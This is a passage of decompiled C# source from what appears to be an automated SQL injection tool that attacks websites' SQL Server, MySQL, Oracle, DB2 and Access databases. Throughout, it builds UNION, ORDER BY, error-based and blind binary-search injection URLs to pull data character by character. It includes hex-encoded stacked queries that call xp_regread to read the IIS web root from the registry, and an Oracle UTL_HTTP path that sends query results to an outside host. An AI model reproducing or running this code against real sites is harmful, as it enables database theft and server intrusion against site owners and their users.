                            if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
                            {
                                str2 = "1";
                            }
                        }
                        else if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
                        {
                            str2 = str2 + ",chr(97)";
                        }
                        else
                        {
                            str2 = str2 + ",NULL";
                        }
                        uRL = URL + this.PreFix + "%20union%20all%20select " + str2 + str + this.CommentString;
                        str5 = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                        if (string.IsNullOrEmpty(WebSite.GetKeyWordBySource(sourceCode, str5, "")))
                        {
                            return (i + 1);
                        }
                    }
                }
                if (((this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer) || (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)) || (this.mainfrm.CurrentSite.DatabaseType == DBType.Access))
                {
                    for (int j = 2; j < 0x80; j++)
                    {
                        uRL = URL + this.PreFix + "%20order%20by%20" + j.ToString() + this.CommentString;
                        str5 = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                        if (!string.IsNullOrEmpty(WebSite.GetKeyWordBySource(sourceCode, str5, "")))
                        {
                            return (j - 1);
                        }
                    }
                }
            }
            return -1;
        }

        private string GetIISWebRoot(string URL)
        {
            this.TempTbNum++;
            string str = "WCRTEMP" + string.Format("{0:D5}", this.TempTbNum);
            string uRL = URL + this.PreFix + ";create table " + str + "(tmp varchar(255))%3B%44%45%43%4C%41%52%45%20%40%70%20%76%61%72%63%68%61%72%28%32%35%35%29%3B%65%78%65%63%20%6D%61%73%74%65%72%2E%2E%78%70%5F%72%65%67%72%65%61%64%20%27%48%4B%45%59%5F%4C%4F%43%41%4C%5F%4D%41%43%48%49%4E%45%27%2C%27%53%4F%46%54%57%41%52%45%5C%4D%69%63%72%6F%73%6F%66%74%5C%49%6E%65%74%53%74%70%27%2C%20%27%50%61%74%68%57%57%57%52%6F%6F%74%27%2C%20%40%70%20%6F%75%74%70%75%74%3Binsert into " + str + "(tmp) values(@p);%2D%2D";
            this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
            this.mainfrm.CurrentSite.WebRoot = this.GetItemBySQLServer("select%20top%201%20", "tmp", "from%20" + str, 0xff, 0xff, false);
            uRL = URL + this.PreFix + ";drop table " + str + "%3B%2D%2D";
            this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
            if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.WebRoot))
            {
                this.TempTbNum++;
                str = "WCRTEMP" + string.Format("{0:D5}", this.TempTbNum);
                uRL = URL + this.PreFix + ";create table " + str + "(tmp varchar(255))%3B%44%45%43%4C%41%52%45%20%40%70%20%76%61%72%63%68%61%72%28%32%35%35%29%3B%65%78%65%63%20%6D%61%73%74%65%72%2E%2E%78%70%5F%72%65%67%72%65%61%64%20%27%48%4B%45%59%5F%4C%4F%43%41%4C%5F%4D%41%43%48%49%4E%45%27%2C%27%53%59%53%54%45%4D%5C%43%6F%6E%74%72%6F%6C%53%65%74%30%30%31%5C%53%65%72%76%69%63%65%73%5C%57%33%53%56%43%5C%50%61%72%61%6D%65%74%65%72%73%5C%56%69%72%74%75%61%6C%20%52%6F%6F%74%73%27%2C%20%27%2F%27%2C%20%40%70%20%6F%75%74%70%75%74%3Binsert into " + str + "(tmp) values(@p);%2D%2D";
                this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                this.mainfrm.CurrentSite.WebRoot = this.GetItemBySQLServer("select%20top%201%20", "tmp", "from%20" + str, 0xff, 0xff, false);
                uRL = URL + this.PreFix + ";drop table " + str + "%3B%2D%2D";
                this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
            }
            this.mainfrm.CurrentSite.WebRoot = this.mainfrm.CurrentSite.WebRoot.Trim();
            return this.mainfrm.CurrentSite.WebRoot;
        }

        private InjectionType GetInjectionType()
        {
            this.InitURL();
            if (this.URL.LastIndexOf('=') < 0)
            {
                this.mainfrm.CurrentSite.InjType = InjectionType.NotInjectable;
                if (this.mainfrm.ReqType == RequestType.GET)
                {
                    MessageBox.Show("* It's not injectable! Please check the URL format and Request Type: GET/POST/COOKIE!\r\n* Example: http://127.0.0.1/view.jsp?user=admin\r\n* If it exists search forms in current page, please input % or other mainfrm.CurrentSite.CurrentKeyWord and submit it! Then Check the radiobutton \"Search\" and Retry!", "Infomation");
                }
            }
            else if (Regex.IsMatch(this.URL.Substring(this.URL.LastIndexOf('=') + 1), @"^[\d\-]+$"))
            {
                this.mainfrm.CurrentSite.InjType = InjectionType.Integer;
                this.InitByInjectionType(this.mainfrm.CurrentSite.InjType, this.URL);
            }
            else
            {
                this.mainfrm.CurrentSite.InjType = InjectionType.String;
                this.InitByInjectionType(this.mainfrm.CurrentSite.InjType, this.URL);
            }
            return this.mainfrm.CurrentSite.InjType;
        }

        private int GetIntValue(string IntSQLExpression, int MaxNum, int MinNum)
        {
            if (this.mainfrm.CurrentSite.BlindInjType == BlindType.UnKnown)
            {
                this.GetBlindType(this.URL);
            }
            if (this.mainfrm.CurrentSite.BlindInjType == BlindType.PlainText)
            {
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
                {
                    string itemBySQLServerPlainText = this.GetItemBySQLServerPlainText("cast((" + IntSQLExpression + ")%20as%20varchar(8))");
                    try
                    {
                        int num = int.Parse(itemBySQLServerPlainText);
                        if (num >= 0)
                        {
                            return num;
                        }
                    }
                    catch
                    {
                    }
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
                {
                    string itemByMySQLPlainText = this.GetItemByMySQLPlainText("cast((" + IntSQLExpression + ")%20as%20char)", 0x20);
                    try
                    {
                        int num2 = int.Parse(itemByMySQLPlainText);
                        if (num2 >= 0)
                        {
                            return num2;
                        }
                    }
                    catch
                    {
                    }
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)
                {
                    string itemByOraclePlainText = this.GetItemByOraclePlainText(IntSQLExpression);
                    try
                    {
                        int num3 = int.Parse(itemByOraclePlainText);
                        if (num3 >= 0)
                        {
                            return num3;
                        }
                    }
                    catch
                    {
                    }
                }
            }
            else if (this.mainfrm.CurrentSite.BlindInjType == BlindType.FieldEcho)
            {
                string s = "";
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
                {
                    s = this.GetItemByFieldEcho("select", "cast((" + IntSQLExpression + ")%20as%20varchar(8))", "", false);
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
                {
                    s = this.GetItemByFieldEcho("select", "cast((" + IntSQLExpression + ")%20as%20char)", "", false);
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)
                {
                    s = this.GetItemByFieldEcho("select", "NVL(cast((" + IntSQLExpression + ")%20as%20varchar(64)),chr(32))", "from dual", false);
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
                {
                    s = this.GetItemByFieldEcho("select", "coalesce(rtrim(cast((" + IntSQLExpression + ")%20as%20char(250))),chr(32))", "from sysibm.sysdummy1", false);
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Access)
                {
                    s = this.GetItemByFieldEcho("select", "cstr(" + IntSQLExpression + ")", "from " + this.ExistedTableInAccess, false);
                }
                try
                {
                    int num4 = int.Parse(s);
                    if (num4 >= 0)
                    {
                        return num4;
                    }
                }
                catch
                {
                }
            }
            else if ((this.mainfrm.CurrentSite.BlindInjType == BlindType.CrossSite) && (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle))
            {
                string str5 = this.GetItemByCrossSite("select", "NVL(cast((" + IntSQLExpression + ")%20as%20varchar(64)),chr(32))", "from dual");
                try
                {
                    int num5 = int.Parse(str5);
                    if (num5 >= 0)
                    {
                        return num5;
                    }
                }
                catch
                {
                }
            }
            this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(this.URL);
            if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
            {
                return -1;
            }
            string uRL = "";
            string sourceCode = "";
            int num6 = -1;
            uRL = this.URL + this.PreFix + "%20" + this.LogicOperator + "%20(" + IntSQLExpression + ")>" + MaxNum.ToString() + this.PostFix;
            sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
            if (string.IsNullOrEmpty(sourceCode))
            {
                return -1;
            }
            if (sourceCode.IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
            {
                return -1;
            }
            do
            {
                string[] strArray2 = new string[] { this.URL, this.PreFix, "%20", this.LogicOperator, "%20(", IntSQLExpression, ")=", ((MaxNum + MinNum) / 2).ToString(), this.PostFix };
                uRL = string.Concat(strArray2);
                sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                if (string.IsNullOrEmpty(sourceCode))
                {
                    sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                }
                if (string.IsNullOrEmpty(sourceCode))
                {
                    return -1;
                }
                if (sourceCode.IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
                {
                    return ((MaxNum + MinNum) / 2);
                }
                string[] strArray3 = new string[9];
                strArray3[0] = this.URL;
                strArray3[1] = this.PreFix;
                strArray3[2] = "%20";
                strArray3[3] = this.LogicOperator;
                strArray3[4] = "%20(";
                strArray3[5] = IntSQLExpression;
                strArray3[6] = ")<";
                strArray3[7] = ((MaxNum + MinNum) / 2).ToString();
                strArray3[8] = this.PostFix;
                uRL = string.Concat(strArray3);
                sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                if (string.IsNullOrEmpty(sourceCode))
                {
                    return -1;
                }
                if (sourceCode.IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
                {
                    MaxNum = ((MaxNum + MinNum) / 2) - 1;
                }
                else if (MinNum == ((MaxNum + MinNum) / 2))
                {
                    MinNum++;
                }
                else
                {
                    MinNum = ((MaxNum + MinNum) / 2) + 1;
                }
            }
            while (MinNum <= MaxNum);
            this.mainfrm.DisplayProgress("Get Int: " + num6.ToString());
            return num6;
        }

        private int GetIntValueByAccess(string SelectExpression, string IntItemExpression, string FromExpression, int MaxNum, int MinNum)
        {
            if (this.mainfrm.CurrentSite.BlindInjType == BlindType.FieldEcho)
            {
                string str = "";
                str = this.GetItemByFieldEcho(SelectExpression, "cstr(" + IntItemExpression + ")", FromExpression, false);
                if (!string.IsNullOrEmpty(str) && Regex.IsMatch(str, @"^\d+$"))
                {
                    int num = int.Parse(str);
                    if (num >= 0)
                    {
                        return num;
                    }
                }
            }
            this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(this.URL);
            if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
            {
                return -1;
            }
            string uRL = "";
            string sourceCode = "";
            string str4 = SelectExpression + " " + IntItemExpression + " " + FromExpression;
            uRL = this.URL + this.PreFix + " " + this.LogicOperator + " (" + str4 + ")>" + MaxNum.ToString() + this.PostFix;
            sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
            if (string.IsNullOrEmpty(sourceCode))
            {
                return -1;
            }
            if (sourceCode.IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
            {
                return -1;
            }
            do
            {
                string[] strArray3 = new string[] { this.URL, this.PreFix, " ", this.LogicOperator, " (", str4, ")=", ((MaxNum + MinNum) / 2).ToString(), this.PostFix };
                uRL = string.Concat(strArray3);
                sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                if (string.IsNullOrEmpty(sourceCode))
                {
                    sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                }
                if (string.IsNullOrEmpty(sourceCode))
                {
                    return -1;
                }
                if (sourceCode.IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
                {
                    return ((MaxNum + MinNum) / 2);
                }
                string[] strArray4 = new string[9];
                strArray4[0] = this.URL;
                strArray4[1] = this.PreFix;
                strArray4[2] = " ";
                strArray4[3] = this.LogicOperator;
                strArray4[4] = " (";
                strArray4[5] = str4;
                strArray4[6] = ")<";
                strArray4[7] = ((MaxNum + MinNum) / 2).ToString();
                strArray4[8] = this.PostFix;
                uRL = string.Concat(strArray4);
                sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                if (string.IsNullOrEmpty(sourceCode))
                {
                    return -1;
                }
                if (sourceCode.IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
                {
                    MaxNum = ((MaxNum + MinNum) / 2) - 1;
                }
                else if (MinNum == ((MaxNum + MinNum) / 2))
                {
                    MinNum++;
                }
                else
                {
                    MinNum = ((MaxNum + MinNum) / 2) + 1;
                }
            }
            while (MinNum <= MaxNum);
            return -1;
        }

        private string GetItemByAccess(string SelectExpression, string ItemName, string FromExpression, int MaxChar, int MaxLength)
        {
            string str = "";
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.UnKnown)
                {
                    this.GetBlindType(this.URL);
                }
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.FieldEcho)
                {
                    str = this.GetItemByFieldEcho(SelectExpression, ItemName, FromExpression, false);
                    if (!string.IsNullOrEmpty(str))
                    {
                        return str;
                    }
                }
                this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(this.URL);
                if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
                {
                    return "";
                }
                int num = this.GetIntValue(SelectExpression + "%20len(" + ItemName + ")%20" + FromExpression, MaxLength, 0);
                this.mainfrm.DisplayProgress("Get Length: " + num.ToString());
                if (num < 1)
                {
                    return "";
                }
                for (int i = 0; i < num; i++)
                {
                    string[] strArray2 = new string[] { SelectExpression, "%20ASC(MID(", ItemName, ",", (i + 1).ToString(), ",1))%20", FromExpression };
                    char ch = (char) this.GetIntValue(string.Concat(strArray2), MaxChar, 0);
                    str = str + ch;
                    this.mainfrm.DisplayProgress("Get " + str.Length.ToString() + "/" + num.ToString() + " :  " + str);
                }
                return str;
            }
            catch
            {
                return str;
            }
        }

        private string GetItemByCrossSite(string SelectExpression, string ItemName, string FromExpression)
        {
            while (this.mainfrm.CurrentSite.HTTPThreadNum > 0)
            {
                Thread.Sleep(500);
            }
            string uRL = this.URL + this.PreFix + "%20" + this.LogicOperator + "%20UTL_HTTP.request(" + this.EscapeSingleQuotes(WCRSetting.CrossSiteURL) + "||(" + SelectExpression + "%20" + ItemName + "%20" + FromExpression + "))=1" + this.CommentString;
            this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
            string str2 = this.mainfrm.CurrentSite.GetSourceCode(WCRSetting.CrossSiteRecord, RequestType.GET, Encoding.UTF8);
            this.mainfrm.DisplayProgress("Getting Item: " + str2 + " - By CrossSite Injection.");
            return str2;
        }

        private string GetItemByDB2(string SelectExpression, string ItemName, string FromExpression, int MaxChar, int MaxLength)
        {
            string str = "";
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.UnKnown)
                {
                    this.GetBlindType(this.URL);
                }
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.FieldEcho)
                {
                    str = this.GetItemByFieldEcho(SelectExpression, ItemName, FromExpression, false);
                    this.mainfrm.DisplayProgress("Get : " + str);
                    if (!string.IsNullOrEmpty(str))
                    {
                        return str;
                    }
                }
                this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(this.URL);
                if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
                {
                    return "";
                }
                int num = this.GetIntValue(SelectExpression + " length(" + ItemName + ") " + FromExpression, MaxLength, 0);
                this.mainfrm.DisplayProgress("Get Length: " + num.ToString());
                if (num < 1)
                {
                    return "";
                }
                List<byte> list = new List<byte>();
                for (int i = 0; i < num; i++)
                {
                    string[] strArray2 = new string[] { SelectExpression, " ASCII(substr(", ItemName, ",", (i + 1).ToString(), ",1)) ", FromExpression };
                    int num3 = this.GetIntValue(string.Concat(strArray2), MaxChar, 0);
                    if (num3 >= 0)
                    {
                        list.Add((byte) num3);
                    }
                    else
                    {
                        string[] strArray3 = new string[] { SelectExpression, " ASCII(substr(", ItemName, ",", (i + 1).ToString(), ",1)) ", FromExpression };
                        num3 = this.GetIntValue(string.Concat(strArray3), 0xffff, 0);
                        if (num3 >= 0)
                        {
                            byte item = (byte) (num3 >> 8);
                            byte num5 = (byte) (num3 & 0xff);
                            if (this.mainfrm.CurrentSite.DBEncoding == Encoding.Unicode)
                            {
                                list.Add(num5);
                                list.Add(item);
                            }
                            else
                            {
                                list.Add(item);
                                list.Add(num5);
                            }
                        }
                        else
                        {
                            string[] strArray4 = new string[] { SelectExpression, " ASCII(substr(", ItemName, ",", (i + 1).ToString(), ",1)) ", FromExpression };
                            num3 = this.GetIntValue(string.Concat(strArray4), 0xefbfbf, 0xe08080);
                            if (num3 > 0)
                            {
                                list.Add((byte) (num3 >> 0x10));
                                list.Add((byte) ((num3 >> 8) & 0xff));
                                list.Add((byte) (num3 & 0xff));
                            }
                            else
                            {
                                list.Add(0x5f);
                            }
                        }
                    }
                    byte[] bytes = list.ToArray();
                    str = this.mainfrm.CurrentSite.DBEncoding.GetString(bytes);
                    string[] strArray5 = new string[6];
                    strArray5[0] = "Get ";
                    strArray5[1] = (i + 1).ToString();
                    strArray5[2] = "/";
                    strArray5[3] = num.ToString();
                    strArray5[4] = " :  ";
                    strArray5[5] = str;
                    this.mainfrm.DisplayProgress(string.Concat(strArray5));
                }
                return str;
            }
            catch
            {
                return str;
            }
        }

        private string GetItemByFieldEcho(string SelectExpression, string ItemName, string FromExpression, bool NeedTempTable)
        {
            while (this.mainfrm.CurrentSite.HTTPThreadNum > 1)
            {
                Thread.Sleep(500);
            }
            string wildField = "";
            string str2 = "";
            for (int i = 0; i < (this.mainfrm.CurrentSite.CurrentFieldEchoIndex - 1); i++)
            {
                if (string.IsNullOrEmpty(wildField))
                {
                    if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
                    {
                        wildField = "1";
                    }
                    else
                    {
                        wildField = this.WildField;
                    }
                }
                else
                {
                    wildField = wildField + "," + this.WildField;
                }
            }
            if (!string.IsNullOrEmpty(wildField))
            {
                wildField = wildField + ",";
            }
            for (int j = 0; j < (this.mainfrm.CurrentSite.CurrentFieldNum - this.mainfrm.CurrentSite.CurrentFieldEchoIndex); j++)
            {
                str2 = str2 + "," + this.WildField;
            }
            string uRL = "";
            string str4 = "";
            if (NeedTempTable)
            {
                this.TempTbNum++;
                string str5 = "WCRTEMP" + string.Format("{0:D5}", this.TempTbNum);
                uRL = this.URL + this.PreFix + ";create table " + str5 + "(tmp varchar(255));insert into " + str5 + "%20" + SelectExpression + "%20" + ItemName + "%20" + FromExpression + "%3B" + this.CommentString;
                this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                str4 = this.GetItemByFieldEcho("select%20top%201%20", "tmp", "from%20" + str5, false);
                uRL = this.URL + this.PreFix + ";drop table " + str5 + "%3B" + this.CommentString;
                this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                this.mainfrm.DisplayProgress("Get Item: " + str4);
                return str4;
            }
            string str6 = "";
            if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
            {
                str6 = "char(33)%2Bchar(83)%2Bchar(33)%2B(" + ItemName + ")%2Bchar(33)%2Bchar(69)%2Bchar(33)";
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
            {
                str6 = "concat(char(33,83,33)," + ItemName + ",char(33,69,33))";
            }
            else if ((this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle) || (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2))
            {
                str6 = "chr(33)||chr(83)||chr(33)||" + ItemName + "||chr(33)||chr(69)||chr(33)";
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Access)
            {
                str6 = "chr(33)%2Bchr(83)%2Bchr(33)%2B(" + ItemName + ")%2Bchr(33)%2Bchr(69)%2Bchr(33)";
            }
            else
            {
                return "";
            }
            uRL = this.URL + this.PreFix + "%20and%201=2%20union%20all%20" + SelectExpression + "%20" + wildField + str6 + str2 + "%20" + FromExpression + this.CommentString;
            Regex regex = new Regex(@"(?<=(!S!))[.\s\S]*?(?=(!E!))", RegexOptions.Singleline | RegexOptions.Multiline);
            for (int k = 0; k < 3; k++)
            {
                string sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                str4 = regex.Match(sourceCode).Value;
                this.mainfrm.DisplayProgress("Get Item: " + str4);
                if (!string.IsNullOrEmpty(str4))
                {
                    return str4;
                }
            }
            return "";
        }

        private string GetItemByMySQL(string SelectExpression, string ItemName, string FromExpression, int MaxChar, int MaxLength)
        {
            string itemByMySQLPlainText = "";
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.UnKnown)
                {
                    this.GetBlindType(this.URL);
                }
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.FieldEcho)
                {
                    itemByMySQLPlainText = this.GetItemByFieldEcho(SelectExpression, ItemName, FromExpression, false);
                    if (!string.IsNullOrEmpty(itemByMySQLPlainText))
                    {
                        return itemByMySQLPlainText;
                    }
                }
                else if (this.mainfrm.CurrentSite.BlindInjType == BlindType.PlainText)
                {
                    if (MaxLength > 0x3e)
                    {
                        int maxLength = this.GetIntValue(SelectExpression + " length(" + ItemName + ") " + FromExpression, MaxLength, 0);
                        this.mainfrm.DisplayProgress("Get Length: " + maxLength.ToString());
                        itemByMySQLPlainText = this.GetItemByMySQLPlainText(SelectExpression + "%20" + ItemName + "%20" + FromExpression, maxLength);
                    }
                    else
                    {
                        itemByMySQLPlainText = this.GetItemByMySQLPlainText(SelectExpression + "%20" + ItemName + "%20" + FromExpression, MaxLength);
                    }
                    this.mainfrm.DisplayProgress("Get : " + itemByMySQLPlainText);
                    if (!string.IsNullOrEmpty(itemByMySQLPlainText))
                    {
                        return itemByMySQLPlainText;
                    }
                }
                this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(this.URL);
                if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
                {
                    return "";
                }
                int num2 = this.GetIntValue(SelectExpression + " char_length(" + ItemName + ") " + FromExpression, MaxLength, 0);
                this.mainfrm.DisplayProgress("Get Length: " + num2.ToString());
                if (num2 < 1)
                {
                    return "";
                }
                List<byte> list = new List<byte>();
                for (int i = 0; i < num2; i++)
                {
                    string[] strArray5 = new string[] { SelectExpression, " ord(substr(", ItemName, ",", (i + 1).ToString(), ",1)) ", FromExpression };
                    int num4 = this.GetIntValue(string.Concat(strArray5), MaxChar, 0);
                    if (num4 >= 0)
                    {
                        list.Add((byte) num4);
                    }
                    else
                    {
                        string[] strArray6 = new string[] { SelectExpression, " ord(substr(", ItemName, ",", (i + 1).ToString(), ",1)) ", FromExpression };
                        num4 = this.GetIntValue(string.Concat(strArray6), 0xffff, 0);
                        if (num4 >= 0)
                        {
                            byte item = (byte) (num4 >> 8);
                            byte num6 = (byte) (num4 & 0xff);
                            if (this.mainfrm.CurrentSite.DBEncoding == Encoding.Unicode)
                            {
                                list.Add(num6);
                                list.Add(item);
                            }
                            else
                            {
                                list.Add(item);
                                list.Add(num6);
                            }
                        }
                        else
                        {
                            string[] strArray7 = new string[] { SelectExpression, " ord(substr(", ItemName, ",", (i + 1).ToString(), ",1)) ", FromExpression };
                            num4 = this.GetIntValue(string.Concat(strArray7), 0xefbfbf, 0xe08080);
                            if (num4 > 0)
                            {
                                list.Add((byte) (num4 >> 0x10));
                                list.Add((byte) ((num4 >> 8) & 0xff));
                                list.Add((byte) (num4 & 0xff));
                            }
                            else
                            {
                                list.Add(0x5f);
                            }
                        }
                    }
                    byte[] bytes = list.ToArray();
                    itemByMySQLPlainText = this.mainfrm.CurrentSite.DBEncoding.GetString(bytes);
                    string[] strArray8 = new string[6];
                    strArray8[0] = "Get ";
                    strArray8[1] = (i + 1).ToString();
                    strArray8[2] = "/";
                    strArray8[3] = num2.ToString();
                    strArray8[4] = " :  ";
                    strArray8[5] = itemByMySQLPlainText;
                    this.mainfrm.DisplayProgress(string.Concat(strArray8));
                }
                return itemByMySQLPlainText;
            }
            catch
            {
                return itemByMySQLPlainText;
            }
        }

        private string GetItemByMySQLPlainText(string ItemName, int MaxLength)
        {
            while (this.mainfrm.CurrentSite.HTTPThreadNum > 1)
            {
                Thread.Sleep(500);
            }
            if (MaxLength <= 0x3e)
            {
                string uRL = this.URL + this.PreFix + "%20" + this.LogicOperator + "%20(1,1)>(select%20count(*),concat((" + ItemName + "),0x3a,floor(rand()*2))%20x%20from%20(select%201%20union%20select%202)%20a%20group%20by%20x%20limit%201)" + this.CommentString;
                string input = "";
                string str3 = "";
                Regex regex = new Regex(@"(?<=\')[^\']+(?=:[01]\')", RegexOptions.Singleline | RegexOptions.Multiline);
                for (int i = 0; i < 0x10; i++)
                {
                    input = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                    str3 = regex.Match(input).Value;
                    if (!string.IsNullOrEmpty(str3))
                    {
                        return str3;
                    }
                }
                return str3;
            }
            int num2 = MaxLength;
            int num3 = 1;
            int num4 = num2;
            string str4 = "";
            while (num4 > 0)
            {
                string itemName = "";
                if (num4 <= 0x3e)
                {
                    itemName = "substr((" + ItemName + ")," + num3.ToString() + ")";
                    num4 = 0;
                }
                else
                {
                    itemName = "substr((" + ItemName + ")," + num3.ToString() + ",62)";
                    num3 += 0x3e;
                    num4 -= 0x3e;
                }
                str4 = str4 + this.GetItemByMySQLPlainText(itemName, 0x3e);
            }
            return str4;
        }

        private string GetItemByOracle(string SelectExpression, string ItemName, string FromExpression, int MaxChar, int MaxLength)
        {
            string itemByOraclePlainText = "";
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.UnKnown)
                {
                    this.GetBlindType(this.URL);
                }
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.PlainText)
                {
                    itemByOraclePlainText = this.GetItemByOraclePlainText(SelectExpression + "%20" + ItemName + "%20" + FromExpression);
                    this.mainfrm.DisplayProgress("Get : " + itemByOraclePlainText);
                    if (!string.IsNullOrEmpty(itemByOraclePlainText))
                    {
                        return itemByOraclePlainText;
                    }
                }
                else if (this.mainfrm.CurrentSite.BlindInjType == BlindType.FieldEcho)
                {
                    itemByOraclePlainText = this.GetItemByFieldEcho(SelectExpression, ItemName, FromExpression, false);
                    this.mainfrm.DisplayProgress("Get : " + itemByOraclePlainText);
                    if (!string.IsNullOrEmpty(itemByOraclePlainText))
                    {
                        return itemByOraclePlainText;
                    }
                }
                else if (this.mainfrm.CurrentSite.BlindInjType == BlindType.CrossSite)
                {
                    itemByOraclePlainText = this.GetItemByCrossSite(SelectExpression, ItemName, FromExpression);
                    this.mainfrm.DisplayProgress("Get : " + itemByOraclePlainText);
                    if (!string.IsNullOrEmpty(itemByOraclePlainText))
                    {
                        return itemByOraclePlainText;
                    }
                }
                this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(this.URL);
                if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
                {
                    return "";
                }
                int num = this.GetIntValue(SelectExpression + " length(" + ItemName + ") " + FromExpression, MaxLength, 0);
                this.mainfrm.DisplayProgress("Get Length: " + num.ToString());
                List<byte> list = new List<byte>();
                for (int i = 0; i < num; i++)
                {
                    string[] strArray3 = new string[] { SelectExpression, " ASCII(substr(", ItemName, ",", (i + 1).ToString(), ",1)) ", FromExpression };
                    int num3 = this.GetIntValue(string.Concat(strArray3), MaxChar, 0);
                    if (num3 >= 0)
                    {
                        list.Add((byte) num3);
                    }
                    else
                    {
                        string[] strArray4 = new string[] { SelectExpression, " ASCII(substr(", ItemName, ",", (i + 1).ToString(), ",1)) ", FromExpression };
                        num3 = this.GetIntValue(string.Concat(strArray4), 0xffff, 0);
                        if (num3 >= 0)
                        {
                            byte item = (byte) (num3 >> 8);
                            byte num5 = (byte) (num3 & 0xff);
                            if (this.mainfrm.CurrentSite.DBEncoding == Encoding.Unicode)
                            {
                                list.Add(num5);
                                list.Add(item);
                            }
                            else
                            {
                                list.Add(item);
                                list.Add(num5);
                            }
                        }
                        else
                        {
                            string[] strArray5 = new string[] { SelectExpression, " ASCII(substr(", ItemName, ",", (i + 1).ToString(), ",1)) ", FromExpression };
                            num3 = this.GetIntValue(string.Concat(strArray5), 0xefbfbf, 0xe08080);
                            if (num3 > 0)
                            {
                                list.Add((byte) (num3 >> 0x10));
                                list.Add((byte) ((num3 >> 8) & 0xff));
                                list.Add((byte) (num3 & 0xff));
                            }
                            else
                            {
                                list.Add(0x5f);
                            }
                        }
                    }
                    byte[] bytes = list.ToArray();
                    itemByOraclePlainText = this.mainfrm.CurrentSite.DBEncoding.GetString(bytes);
                    string[] strArray6 = new string[6];
                    strArray6[0] = "Get ";
                    strArray6[1] = (i + 1).ToString();
                    strArray6[2] = "/";
                    strArray6[3] = num.ToString();
                    strArray6[4] = " :  ";
                    strArray6[5] = itemByOraclePlainText;
